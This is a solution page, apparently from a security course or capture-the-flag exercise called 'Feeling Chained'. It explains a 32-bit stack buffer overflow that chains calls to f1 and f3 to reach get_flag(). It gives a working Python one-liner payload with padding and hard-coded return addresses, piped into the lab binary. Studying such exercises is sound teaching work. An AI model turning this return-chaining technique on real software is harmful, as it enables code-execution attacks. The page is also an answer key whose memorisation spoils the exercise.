---
nav_order: 1
parent: 'Task: Feeling Chained'
---

# Solution

> 💡 **Note**: The buffer overflow shown here works on 32-bit binaries where function arguments are passed on the stack, allowing us to directly place values after the return addresses.

By using the buffer overflow in `gateway()`, functions `f1(56, 13)` and `f3(13)` need to be called in this order, with those exact parameters.
`f3` is the one that actually calls `get_flag()`.
Calling `get_flag()` directly shouldn't work (a global variable is checked to make sure all steps were made).

```sh
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*22 +
    b"\x48\x93\x04\x08" +  # f1 address
    b"\xf2\x92\x04\x08" +  # f3 address
    b"\x38\x00\x00\x00" +  # 56
    b"\x0d\x00\x00\x00"    # 13
)' | ./buff-ovf3
```
